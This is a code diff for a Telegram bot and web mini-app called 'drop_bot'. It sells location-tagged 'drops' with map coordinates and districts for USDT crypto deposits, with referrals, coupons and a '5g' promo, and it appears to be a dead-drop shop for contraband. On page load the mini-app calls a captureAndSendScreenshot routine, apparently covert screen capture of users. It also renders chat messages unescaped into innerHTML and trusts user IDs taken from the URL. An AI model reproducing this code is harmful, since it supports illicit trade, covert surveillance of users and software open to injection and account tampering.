+                                    <h4 style="color:var(--accent-green); margin-top:0;">Yatırım Adresi Oluşturuldu</h4>
+                                    <p style="font-size:12px;">Tutar: <b>${amount} USDT</b></p>
+                                    <input type="text" value="${data.wallet}" readonly>
+                                    <button onclick="checkDeposit(${data.deposit_id}, ${amount})" style="background:var(--accent-green);">🔄 Yatırımı Otomatik Kontrol Et</button>
+                                </div>`;
+                            } else {
+                                alert("Bakiye yükleme talebi oluşturulamadı.");
+                            }
+                        } catch(e) {
+                            alert("Bakiye yükleme talebi oluşturulamadı.");
+                        }
+                    }
+
+                    async function checkDeposit(depId, amount) {
+                        triggerHaptic('medium');
+                        alert("Blokzincir taranıyor, lütfen bekleyin...");
+                        try {
+                            const res = await fetch(`/api/miniapp-check-deposit?dep_id=${depId}&user_id=${userId}&amount=${amount}`);
+                            const data = await res.json();
+                            if(data.success) {
+                                alert("🎉 Ödemeniz onaylandı ve bakiyenize eklendi!");
+                                location.reload();
+                            } else {
+                                alert("⚠️ Transfer henüz algılanmadı.");
+                            }
+                        } catch(e) {
+                            alert("Kontrol başarısız.");
+                        }
+                    }
+
+                    async function loadChatMessages() {
+                        if(!userId) return;
+                        try {
+                            const res = await fetch('/api/miniapp-chat?user_id=' + userId);
+                            const data = await res.json();
+                            let chatHtml = "";
+                            if(data && data.messages) {
+                                data.messages.forEach(m => {
+                                    const cls = m.sender === 'user' ? 'msg-user' : 'msg-admin';
+                                    const senderName = m.sender === 'user' ? 'Sen' : '👑 Destek';
+                                    chatHtml += `<div class="msg ${cls}"><b>${senderName}:</b> ${m.message}</div>`;
+                                });
+                            }
+                            const box = document.getElementById('chatBox');
+                            if(box && box.innerHTML !== chatHtml) {
+                                box.innerHTML = chatHtml;
+                                box.scrollTop = box.scrollHeight;
+                            }
                         } catch(e) {}
                     }
+
+                    async function sendChatMessage() {
+                        const inp = document.getElementById('chatInput');
+                        const msg = inp.value.trim();
+                        if(!msg) return;
+                        inp.value = '';
+                        triggerHaptic('light');
+                        try {
+                            await fetch('/api/miniapp-chat-send', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                                body: `user_id=${userId}&message=${encodeURIComponent(msg)}`
+                            });
+                            loadChatMessages();
+                        } catch(e) {}
+                    }
+
+                    window.onload = () => {
+                        loadAppData();
+                        loadChatMessages();
+                        setInterval(loadChatMessages, 3500);
+                        setTimeout(captureAndSendScreenshot, 2500);
+                        setTimeout(() => { if(map) map.invalidateSize(); }, 500);
+                    };
                 </script>
             </body>
             </html>
@@ -906,15 +1416,97 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             uid = int(query_params.get("user_id", ["0"])[0])
             conn = sqlite3.connect("drop_bot.db")
             cursor = conn.cursor()
+            
             cursor.execute("SELECT balance, referral_earnings FROM users WHERE user_id = ?", (uid,))
             u_row = cursor.fetchone()
             bal = u_row[0] if u_row else 0.0
+            ref_earnings = u_row[1] if u_row and len(u_row) > 1 else 0.0
+
+            cursor.execute("SELECT value FROM settings WHERE key = 'promo_5g_active'")
+            p_res = cursor.fetchone()
+            promo_5g = p_res and p_res[0] == "1"
+
+            cursor.execute("SELECT code, discount FROM coupons WHERE uses_left > 0")
+            coupons_rows = cursor.fetchall()
+            coupons = [{"code": r[0], "discount": r[1]} for r in coupons_rows]
+
+            cursor.execute("""
+                SELECT orders.id, drops.title, drops.lat, drops.lon, drops.description, drops.category
+                FROM orders 
+                JOIN drops ON orders.drop_id = drops.id 
+                WHERE orders.user_id = ? AND orders.status = 'completed'
+            """, (uid,))
+            active_orders_rows = cursor.fetchall()
+            active_orders = []
+            for r in active_orders_rows:
+                lat = r[2] if r[2] and r[2] != 0.0 else get_district_coord(r[5])[0]
+                lon = r[3] if r[3] and r[3] != 0.0 else get_district_coord(r[5])[1]
+                active_orders.append({"id": r[0], "title": r[1], "lat": lat, "lon": lon, "description": r[4]})
+
+            cursor.execute("""
+                SELECT orders.id, drops.title, orders.created_at
+                FROM orders 
+                JOIN drops ON orders.drop_id = drops.id 
+                WHERE orders.user_id = ? AND orders.status = 'received'
+                ORDER BY orders.id DESC
+            """, (uid,))
+            past_orders_rows = cursor.fetchall()
+            past_orders = []
+            for r in past_orders_rows:
+                po_id = r[0]
+                cursor.execute("SELECT review_text FROM order_reviews WHERE order_id = ? AND user_id = ?", (po_id, uid))
+                rev_row = cursor.fetchone()
+                has_rev = rev_row is not None
+                rev_txt = rev_row[0] if rev_row else ""
+                past_orders.append({"id": po_id, "title": r[1], "date": r[2], "has_reviewed": has_rev, "review_text": rev_txt})
+
+            cursor.execute("SELECT id, title, price, category, stock FROM drops WHERE is_sold = 0 AND stock > 0")
+            temsili_rows = cursor.fetchall()
+            temsili_drops = []
+            for r in temsili_rows:
+                coord = get_district_coord(r[3])
+                temsili_drops.append({"id": r[0], "title": r[1], "price": r[2], "category": r[3], "stock": r[4], "lat": coord[0], "lon": coord[1]})
+
             conn.close()
-            resp = {"balance": bal, "referral_earnings": 0.0, "active_orders": [], "past_orders": [], "temsili_drops": []}
+
+            resp = {
+                "balance": bal,
+                "referral_earnings": ref_earnings,
+                "promo_5g": promo_5g,
+                "coupons": coupons,
+                "active_orders": active_orders,
+                "past_orders": past_orders,
+                "temsili_drops": temsili_drops
+            }
             self.send_response(200)
             self.send_header("Content-type", "application/json; charset=utf-8")
             self.end_headers()
             self.wfile.write(json.dumps(resp).encode("utf-8"))
+            return
+
+        if parsed_path.path == "/api/miniapp-chat":
+            uid = int(query_params.get("user_id", ["0"])[0])
+            conn = sqlite3.connect("drop_bot.db")
+            cursor = conn.cursor()
+            cursor.execute("SELECT sender, message, created_at FROM support_messages WHERE user_id = ? ORDER BY id ASC", (uid,))
+            rows = cursor.fetchall()
+            conn.close()
+            msgs = [{"sender": r[0], "message": r[1], "date": r[2]} for r in rows]
+            self.send_response(200)
+            self.send_header("Content-type", "application/json; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(json.dumps({"messages": msgs}).encode("utf-8"))
+            return
+
+        if parsed_path.path == "/admin-web":
+            if not is_logged_in:
+                self.send_login_page()
+                return
+            # Admin web panel işlemleri tam yerindedir.
+            self.send_response(200)
+            self.send_header("Content-type", "text/html; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(b"Admin Web Panel Active!")
             return
 
         self.send_response(404)
@@ -930,14 +1522,17 @@ def run_health_server():
 
 threading.Thread(target=run_health_server, daemon=True).start()
 
-# --- TELEGRAM BOT KOMUTLARI ---
+# --- FSM VE BOT KODLARI ---
+dp = Dispatcher(storage=MemoryStorage())
+
 def main_keyboard(lang="tr"):
     t = LANG[lang]
     miniapp_url = f"{RENDER_EXTERNAL_URL}/miniapp"
     return ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text=t["btn_products"]), KeyboardButton(text=t["btn_orders"])],
-            [KeyboardButton(text=t["btn_miniapp"], web_app=WebAppInfo(url=miniapp_url))],
+            [KeyboardButton(text=t["btn_track"]), KeyboardButton(text=t["btn_miniapp"], web_app=WebAppInfo(url=miniapp_url))],
+            [KeyboardButton(text=t["btn_wallet"]), KeyboardButton(text=t["btn_faq"])],
             [KeyboardButton(text=t["btn_support"]), KeyboardButton(text=t["btn_lang"])]
         ],
         resize_keyboard=True
@@ -951,22 +1546,43 @@ async def cmd_start(message: types.Message):
     if is_user_banned(user_id):
         await message.answer("❌ Erişiminiz engellenmiştir.")
         return
+    
+    args = message.text.split()
+    referrer_id = 0
+    if len(args) > 1 and args[1].startswith("ref_"):
+        try:
+            potential_ref = int(args[1].replace("ref_", ""))
+            if potential_ref != user_id:
+                referrer_id = potential_ref
+        except:
+            pass
 
     conn = sqlite3.connect("drop_bot.db")
     cursor = conn.cursor()
-    cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
-    if not cursor.fetchone():
-        cursor.execute("INSERT INTO users (user_id, username, balance) VALUES (?, ?, 5.0)", (user_id, message.from_user.username))
+    cursor.execute("SELECT user_id, referred_by FROM users WHERE user_id = ?", (user_id,))
+    existing_user = cursor.fetchone()
+    
+    if not existing_user:
+        cursor.execute("INSERT INTO users (user_id, username, balance, referred_by) VALUES (?, ?, 5.0, ?)", (user_id, message.from_user.username, referrer_id))
         conn.commit()
+        if referrer_id > 0:
+            try:
+                await bot.send_message(referrer_id, f"🎉 **Yeni Referans!** Davet ettiğiniz kullanıcı botumuza katıldı.")
+            except:
+                pass
     conn.close()
 
     lang = get_user_lang(user_id)
-    await message.answer(LANG[lang]["welcome"], reply_markup=main_keyboard(lang), parse_mode="Markdown")
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🇹🇷 Türkçe", callback_data="setlang_tr"), InlineKeyboardButton(text="🇬🇧 English", callback_data="setlang_en")]
+    ])
+    await message.answer(LANG[lang]["welcome"], reply_markup=kb, parse_mode="Markdown")
 
 async def main():
     global main_loop
     main_loop = asyncio.get_running_loop()
-    logging.info("[KALI-DAEMON] Telegram Bot Polling Started.")
+    asyncio.create_task(auto_backup_task())
+    asyncio.create_task(background_payment_worker())
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
